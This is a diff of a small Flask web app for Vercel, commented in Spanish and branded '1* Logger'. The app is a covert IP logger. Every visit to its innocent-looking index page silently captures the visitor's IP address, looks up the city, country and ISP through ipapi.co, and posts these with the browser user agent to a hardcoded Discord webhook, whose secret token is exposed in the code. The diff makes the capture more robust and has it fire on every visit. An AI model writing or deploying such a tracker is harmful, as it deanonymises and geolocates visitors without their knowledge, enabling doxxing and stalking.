@@ -1,61 +1,68 @@
+import os
 from flask import Flask, render_template, request
 import requests
 from datetime import datetime
-import os
 
-app = Flask(__name__, template_folder='../templates')
+# Configuración de carpetas para Vercel
+current_dir = os.path.dirname(os.path.abspath(__file__))
+template_dir = os.path.join(current_dir, '..', 'templates')
 
-# CONFIGURACIÓN
+app = Flask(__name__, template_folder=template_dir)
+
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
 AVATAR_URL = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"
 
-def send_to_discord(ip_data, user_agent):
-    ip = ip_data.get('ip', 'N/A')
+def send_to_discord(ip, user_agent, geo_data=None):
+    if not geo_data: geo_data = {}
     
     embed = {
-        "title": "⚡ Sistema Vercel: IP Detectada",
-        "description": "Se ha registrado un acceso mediante el túnel seguro.",
+        "title": "⚡ IP Capturada (Vercel)",
         "color": 0x00D2FF,
         "fields": [
             {"name": "🌐 IP Pública", "value": f"**`{ip}`**", "inline": True},
-            {"name": "📍 Ubicación", "value": f"{ip_data.get('city', 'Desconocida')}, {ip_data.get('country_name', 'N/A')}", "inline": True},
-            {"name": "🏢 Proveedor (ISP)", "value": f"{ip_data.get('org', 'Desconocido')}", "inline": False},
-            {"name": "🌍 Región / Mapa", "value": f"{ip_data.get('region', 'N/A')} ([Abrir Mapa](https://www.google.com/maps/search/?api=1&query={ip_data.get('latitude')},{ip_data.get('longitude')}))", "inline": False},
-            {"name": "🕒 Conexión", "value": f"{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", "inline": True},
+            {"name": "📍 Ubicación", "value": f"{geo_data.get('city', 'Desconocida')}, {geo_data.get('country_name', 'N/A')}", "inline": True},
+            {"name": "🏢 ISP", "value": f"{geo_data.get('org', 'Desconocido')}", "inline": False},
             {"name": "📱 User-Agent", "value": f"```\n{user_agent}\n```", "inline": False}
         ],
-        "footer": {
-            "text": "1* Logger • Vercel Premium Edition",
-            "icon_url": AVATAR_URL
-        },
-        "thumbnail": {
-            "url": AVATAR_URL
-        }
+        "footer": {"text": "1* Logger • al3xg0nzalezzz", "icon_url": AVATAR_URL},
+        "thumbnail": {"url": AVATAR_URL}
     }
     
-    payload = {
-        "username": "1* Logger",
-        "avatar_url": AVATAR_URL,
-        "embeds": [embed]
-    }
-    
-    requests.post(DISCORD_WEBHOOK_URL, json=payload)
+    payload = {"username": "1* Logger", "avatar_url": AVATAR_URL, "embeds": [embed]}
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
+    except:
+        pass
 
 @app.route('/')
 def index():
-    # Detectar IP real en Vercel
-    ip = request.headers.get('x-forwarded-for', request.remote_addr)
-    if ',' in ip: ip = ip.split(',')[0]
-    
-    user_agent = request.headers.get('user-agent')
+    # 1. TRIPLE VERIFICACIÓN DE IP (Específico para Vercel)
+    ip = request.headers.get('x-real-ip') # Opción A
+    if not ip:
+        ip = request.headers.get('x-forwarded-for') # Opción B
+        if ip and ',' in ip:
+            ip = ip.split(',')[0].strip()
+    if not ip:
+        ip = request.remote_addr # Opción C (Fallback)
 
-    try:
-        geo_res = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
-    except:
-        geo_res = {"ip": ip}
+    user_agent = request.headers.get('user-agent', 'Desconocido')
 
-    send_to_discord(geo_res, user_agent)
+    # 2. INTENTAR OBTENER GEO-DATA (Si falla, enviamos solo la IP)
+    geo_res = {}
+    if ip and ip != '127.0.0.1':
+        try:
+            # Usamos una API más permisiva para servidores
+            res = requests.get(f"https://ipapi.co/{ip}/json/", headers={'User-Agent': 'Mozilla/5.0'}, timeout=5)
+            if res.status_code == 200:
+                geo_res = res.json()
+        except:
+            pass
+
+    # 3. ENVIAR SIEMPRE
+    if not ip: ip = "No detectada"
+    send_to_discord(ip, user_agent, geo_res)
+
     return render_template('index.html')
 
-# Vercel espera una variable llamada 'app' en el archivo de la API
-# No es necesario app.run() aquí
+# Para Vercel
+app_dispatch = app
